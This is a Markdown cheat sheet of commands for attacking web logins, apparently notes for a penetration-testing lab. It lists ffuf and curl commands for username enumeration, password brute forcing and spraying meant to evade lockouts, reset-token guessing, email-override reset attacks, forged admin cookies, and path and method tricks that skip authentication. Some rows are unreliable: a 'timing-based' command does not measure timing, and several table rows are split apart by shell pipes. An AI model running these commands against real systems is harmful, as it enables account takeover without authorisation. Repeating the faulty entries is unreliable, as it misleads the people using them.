# Authentication Bypass – Command Cheat Sheet

This cheat sheet contains the essential commands for enumeration, brute forcing, logic flaw testing, cookie manipulation, encoding/decoding, and general authentication bypass work.
Each table includes:

* Purpose
* Command
* Description

# 1. Username Enumeration Commands

### Username Enumeration Cheat Sheet

| Purpose                     | Command                                                                                                                                                     | Description                                                                           |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Form-based username fuzzing | `ffuf -w usernames.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://target/login -mr "user exists"` | Tests each value in usernames.txt to identify valid usernames based on response text. |
| URL parameter fuzzing       | `ffuf -w usernames.txt -u http://target/login?user=FUZZ -mr "valid"`                                                                                        | Injects usernames into URL query parameters.                                          |
| JSON body fuzzing           | `ffuf -w usernames.txt -X POST -H "Content-Type: application/json" -d '{"username":"FUZZ","password":"x"}' -u http://target/api/login -mr "exists"`         | For APIs using JSON.                                                                  |
| Timing-based enumeration    | `ffuf -w usernames.txt -u http://target/login?user=FUZZ -mc 200 -ac`                                                                                        | Detects username validity based on server response delay.                             |
| Manual curl enumeration     | `curl -X POST http://target/login -d "username=test&password=123"`                                                                                          | Used to manually compare server messages.                                             |


# 2. Password Brute Forcing Commands

### Password Attack Cheat Sheet

| Purpose                                | Command                                                                                                                                    | Description                                             |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------- |
| Single-user brute force                | `ffuf -w passwords.txt -X POST -d "username=user&password=FUZZ" -u http://target/login -fc 200`                                            | Tests password list for one username.                   |
| Multi-user brute force                 | `ffuf -w users.txt:U,pass.txt:P -X POST -d "username=U&password=P" -u http://target/login -fc 200`                                         | Tests multiple username/password combos.                |
| Password spraying                      | `for u in $(cat users.txt); do curl -d "username=$u&password=Password1" http://target/login; done`                                         | Uses one password against all users (defeats lockouts). |
| API-login brute force                  | `ffuf -w passwords.txt -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' -u http://target/api/login -fc 200` | Brute forces API authentication.                        |
| Detecting successful login by redirect | `ffuf -w passwords.txt -X POST -d "username=user&password=FUZZ" -u http://target/login -mc 302`                                            | Searches for redirect on success.                       |


# 3. Logic Flaw Testing Commands

### Logic Flaw Attack Cheat Sheet

| Purpose                      | Command                                                       | Description                                                |
| ---------------------------- | ------------------------------------------------------------- | ---------------------------------------------------------- |
| Case bypass test             | `curl http://target/AdMiN`                                    | Detects case-sensitive path checks.                        |
| Trailing slash bypass        | `curl http://target/admin/`                                   | Can bypass routing restrictions.                           |
| Double-slash bypass          | `curl http://target//admin`                                   | Some servers collapse or skip authentication checks.       |
| Missing step bypass          | `curl -d "token=known&pass=new" http://target/reset/step2`    | Tests whether steps are validated.                         |
| POST overrides GET           | `curl 'http://target/reset?email=victim' -d 'email=attacker'` | Checks if POST parameters overwrite secure GET parameters. |
| Confused-deputy flow testing | `curl -X POST http://target/auth -d "role=admin"`             | Tests whether the server trusts user-provided roles.       |
| Bypass with OPTIONS method   | `curl -X OPTIONS http://target/admin`                         | Checks for improper method handling.                       |
| HEAD method bypass           | `curl -X HEAD http://target/admin`                            | Sometimes bypasses authentication middleware.              |


# 4. Password Reset Exploitation Commands

### Reset Function Attack Cheat Sheet

| Purpose                  | Command                                                                        | Description                                        |
| ------------------------ | ------------------------------------------------------------------------------ | -------------------------------------------------- |
| Request a reset link     | `curl http://target/reset?email=user@example.com`                              | Tests whether email validation exists.             |
| Override email parameter | `curl -X POST http://target/reset -d "email=attacker@example.com&user=victim"` | Tests email override flaws.                        |
| Test GET/POST merge      | `curl 'http://target/reset?email=a' -d 'email=b'`                              | Reveals whether POST overrides GET.                |
| Check token binding      | `curl http://target/reset?token=12345`                                         | Tests whether token is user-bound.                 |
| Brute force reset tokens | `ffuf -w tokens.txt -u http://target/reset?token=FUZZ -mc 200`                 | Attempts token prediction.                         |
| Modify token parameters  | `curl -d "token=abc&uid=1" http://target/reset`                                | Tests if user ID and token are validated together. |


# 5. Cookie and Session Manipulation Commands

### Cookie Attack Cheat Sheet

| Purpose                         | Command                                                         | Description                               |                                    |
| ------------------------------- | --------------------------------------------------------------- | ----------------------------------------- | ---------------------------------- |
| View response cookies           | `curl -I http://target`                                         | Lists Set-Cookie headers.                 |                                    |
| Send modified cookie            | `curl -H "Cookie: admin=true; session=1" http://target`         | Tests authorization via cookie tampering. |                                    |
| Decode cookie value (Base64)    | `echo "encoded=="                                               | base64 -d`                                | Reveals encoded session data.      |
| Encode modified data            | `echo '{"admin":true}'                                          | base64`                                   | Creates modified session.          |
| Replay known session            | `curl -H "Cookie: session=abcd1234" http://target`              | Checks session fixation susceptibility.   |                                    |
| Hex-decode cookie               | `echo "hexstring"                                               | xxd -r -p`                                | Converts hex cookies to plaintext. |
| JWT decode without verification | `jwttool token.jwt`                                             | Reads header/payload.                     |                                    |
| Alter Base64 cookie directly    | `curl -H "Cookie: data=eyJyb2xlIjoiYWRtaW4ifQ==" http://target` | Tests weakly encoded roles.               |                                    |


# 6. Encoding, Decoding, Hashing Commands

### Encoding/Decoding Cheat Sheet

| Purpose       | Command                                                                 | Description                    |                               |
| ------------- | ----------------------------------------------------------------------- | ------------------------------ | ----------------------------- |
| Base64 encode | `echo -n "text"                                                         | base64`                        | Converts plaintext to Base64. |
| Base64 decode | `echo "dGV4dA=="                                                        | base64 -d`                     | Converts Base64 to plaintext. |
| URL encode    | `python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"`   | Encodes unsafe URL characters. |                               |
| URL decode    | `python3 -c "import urllib.parse; print(urllib.parse.unquote('text'))"` | Decodes encoded URLs.          |                               |
| Hex encode    | `echo -n "text"                                                         | xxd -ps`                       | Converts plaintext to hex.    |
| Hex decode    | `echo "74657874"                                                        | xxd -r -ps`                    | Converts hex to plaintext.    |

### Hashing Cheat Sheet

| Hash Type | Command         | Description |                           |
| --------- | --------------- | ----------- | ------------------------- |
| MD5       | `echo -n "text" | md5sum`     | Generates MD5 hash.       |
| SHA1      | `echo -n "text" | sha1sum`    | Generates SHA1 hash.      |
| SHA256    | `echo -n "text" | sha256sum`  | Generates SHA256 hash.    |
| SHA512    | `echo -n "text" | sha512sum`  | Strong hashing algorithm. |


# 7. General Curl Command Cheat Sheet

### Curl Usage Table

| Purpose                | Command                                                                       | Description                               |
| ---------------------- | ----------------------------------------------------------------------------- | ----------------------------------------- |
| Basic GET request      | `curl http://target`                                                          | Fetches page content.                     |
| POST request           | `curl -X POST -d "a=1&b=2" http://target`                                     | Sends form data.                          |
| JSON POST              | `curl -X POST -H "Content-Type: application/json" -d '{"a":1}' http://target` | API-based login testing.                  |
| Add headers            | `curl -H "Authorization: Bearer token"`                                       | Used for API testing.                     |
| Add cookies            | `curl -H "Cookie: session=123"`                                               | Used for testing session manipulation.    |
| Follow redirects       | `curl -L http://target`                                                       | Follows 301/302 authentication redirects. |
| Show request/response  | `curl -v http://target`                                                       | Debugs the full HTTP exchange.            |
| Silent but show errors | `curl -sS http://target`                                                      | Cleaner testing output.                   |


# 8. General ffuf Command Cheat Sheet

### ffuf Usage Table

| Purpose             | Command                                                                                   | Description                                          |
| ------------------- | ----------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| Directory fuzzing   | `ffuf -w dirs.txt -u http://target/FUZZ`                                                  | Enumerates hidden endpoints.                         |
| Parameter fuzzing   | `ffuf -w params.txt -u http://target/?FUZZ=value`                                         | Tests for injectable parameters.                     |
| Subdomain fuzzing   | `ffuf -w subs.txt -u http://FUZZ.target`                                                  | Enumerates virtual hosts.                            |
| POST fuzzing        | `ffuf -X POST -d "user=FUZZ" -u http://target/login`                                      | Tests form parameters.                               |
| JSON fuzzing        | `ffuf -X POST -H "Content-Type: application/json" -d '{"u":"FUZZ"}' -u http://target/api` | Fuzzes API endpoints.                                |
| Match string        | `-mr "success"`                                                                           | Shows responses containing a keyword.                |
| Filter by status    | `-fc 404`                                                                                 | Hide unwanted codes.                                 |
| Filter by size      | `-fs 5000`                                                                                | Hide repeated responses.                             |
| Match by-line count | `-ml 100`                                                                                 | Identify noticeable differences in response content. |
| Multiple wordlists  | `ffuf -w list1:A,list2:B`                                                                 | Assigns placeholders for multi-field injections.     |


# 9. Authentication Bypass Testing Workflow (Summary Table)

| Step | Action                      | Tools             |
| ---- | --------------------------- | ----------------- |
| 1    | Username enumeration        | ffuf, curl        |
| 2    | Password brute force        | ffuf              |
| 3    | Logic flaw testing          | curl              |
| 4    | Password reset testing      | curl, ffuf        |
| 5    | Cookie manipulation         | curl, base64, xxd |
| 6    | Session tampering           | curl              |
| 7    | Encoding/hashing inspection | base64, sha256sum |
| 8    | Admin endpoint probing      | curl, ffuf        |
